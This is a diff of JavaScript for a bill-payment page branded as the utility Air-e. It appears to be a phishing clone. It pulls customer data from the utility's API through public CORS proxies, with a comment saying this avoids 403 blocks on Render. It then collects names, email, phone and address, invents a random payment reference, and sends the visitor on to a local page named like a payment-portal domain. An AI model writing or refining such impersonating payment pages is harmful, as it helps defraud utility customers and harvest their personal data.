@@ -1,4 +1,4 @@
-// --- 1. LÓGICA DE MENÚ ---
+// --- 1. LÓGICA DE MENÚ (SIDEBAR) ---
 const hamburgerBtn = document.getElementById('hamburgerBtn');
 const hamburgerBtnDesktop = document.getElementById('hamburgerBtnDesktop'); 
 const sidebar = document.getElementById('sidebar');
@@ -31,7 +31,7 @@ if(checkboxContainer){
     });
 }
 
-// --- 3. LÓGICA DE CONSULTA (MULTÍ-PROXY PARA RENDER) ---
+// --- 3. LÓGICA PRINCIPAL (CONEXIÓN Y RENDERIZADO) ---
 const btnPagar = document.getElementById('btnPagar');
 const whitePanel = document.getElementById('whitePanel');
 const originalTitleStrip = document.getElementById('originalTitleStrip');
@@ -52,34 +52,34 @@ if(btnPagar) {
 
         const targetUrl = `https://caribesol.facture.co/DesktopModules/Gateway.Pago.ConsultaAnonima/API/ConsultaAnonima/getPolizaOpen?cd_poliza=${nic}`;
         
-        // Intentar con varios proxies si uno falla (especialmente útil en Render)
-        const proxies = [
-            `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}&t=${Date.now()}`,
+        // PROXIES: Probamos varios para evitar el error 403 en Render
+        const proxyList = [
+            `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}&_=${Date.now()}`,
             `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(targetUrl)}`,
             `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`
         ];
 
         let finalData = null;
 
-        for (let p of proxies) {
+        for (let url of proxyList) {
             try {
-                const response = await fetch(p);
+                const response = await fetch(url);
                 if (!response.ok) continue;
-                const json = await response.json();
+                const result = await response.json();
                 
-                // Normalizar respuesta
-                let raw = json.contents ? json.contents : json;
+                // Normalización de datos (AllOrigins usa .contents, otros no)
+                let raw = result.contents ? result.contents : result;
                 let parsed = (typeof raw === 'string') ? JSON.parse(raw) : raw;
 
                 if (parsed && (parsed.ACCOUNTS || parsed.NAME)) {
                     finalData = parsed;
-                    break;
+                    break; 
                 }
-            } catch (e) { console.error("Fallo proxy:", p); }
+            } catch (err) { console.warn("Proxy fallido, intentando siguiente..."); }
         }
 
         if (!finalData) {
-            alert("Error de conexión. El servidor de Air-e no responde. Intenta de nuevo.");
+            alert("No pudimos conectar con Air-e. Por favor intenta de nuevo en un momento.");
             location.reload();
             return;
         }
@@ -93,13 +93,13 @@ if(btnPagar) {
             valorMesNum = parseFloat(info.INVOICES[info.INVOICES.length - 1].ADJUST_BALANCE) || 0;
         }
 
-        // --- MOSTRAR RESULTADOS Y FORMULARIO ---
+        // --- PANTALLA DE RESULTADOS (FORMULARIO COMPLETO) ---
         whitePanel.innerHTML = `
         <div class="invoice-view">
             <div class="invoice-header"><h3>PAGUE SU FACTURA</h3></div>
-            <div style="text-align:center; padding:10px; background:#f0f4f8; margin-bottom:15px; border-radius:5px;">
+            <div style="text-align:center; padding:10px; background:#f0f4f8; margin-bottom:15px; border-radius:5px; border:1px solid #d1d9e6;">
                 <strong style="display:block; color:#004a99; text-transform:uppercase;">${nombreUsuario}</strong>
-                <small>${info.COLLECTION_ADDRESS || 'Dirección de suministro'}</small>
+                <small>${info.COLLECTION_ADDRESS || 'Dirección no disponible'}</small>
             </div>
             
             <div class="invoice-form-grid">
@@ -151,39 +151,43 @@ if(btnPagar) {
     });
 }
 
-// --- 4. FUNCIÓN PARA PASAR DATOS A LA SIGUIENTE PÁGINA ---
+// --- 4. FUNCIÓN DE GUARDADO (NO OMITE NADA) ---
 window.guardarYRedirigir = function(monto, tipo) {
+    // Capturamos todos los campos
     const nom = document.getElementById('nombres').value.trim();
     const ape = document.getElementById('apellidos').value.trim();
     const mail = document.getElementById('correo').value.trim();
     const cel = document.getElementById('celular').value.trim();
+    const nic = document.getElementById('numId').value;
+    const dir = document.getElementById('direccion').value;
     const term = document.getElementById('checkTerm');
 
+    // Validación estricta
     if(!nom || !ape || !mail || !cel) {
-        alert("Por favor, complete todos los campos (Nombres, Apellidos, Correo y Celular).");
+        alert("Por favor, complete todos los campos requeridos (Nombres, Apellidos, Correo y Celular).");
         return;
     }
-    if(!term.checked) {
-        alert("Debe aceptar los términos.");
+    if(!term || !term.checked) {
+        alert("Debe aceptar los términos y condiciones.");
         return;
     }
 
-    // Estructura exacta de datos para la página portalpagos
+    // Creamos el objeto EXACTO que espera tu siguiente página
     const datosFactura = {
         nombreCompleto: nom + " " + ape,
-        numId: document.getElementById('numId').value,
+        numId: nic,
         correo: mail,
         celular: cel,
-        direccion: document.getElementById('direccion').value,
+        direccion: dir,
         montoPagar: parseInt(monto),
         tipoPago: tipo, // 'mensual' o 'total'
         referencia: "AIR" + Math.floor(Math.random() * 900000 + 100000),
         fecha: new Date().toLocaleDateString()
     };
     
-    // Guardamos en el local storage
+    // Guardamos en LocalStorage
     localStorage.setItem('datosFactura', JSON.stringify(datosFactura));
     
-    // Redirigimos
+    // Redirección final
     window.location.href = 'portalpagos.portalfacture.com.html';
 };
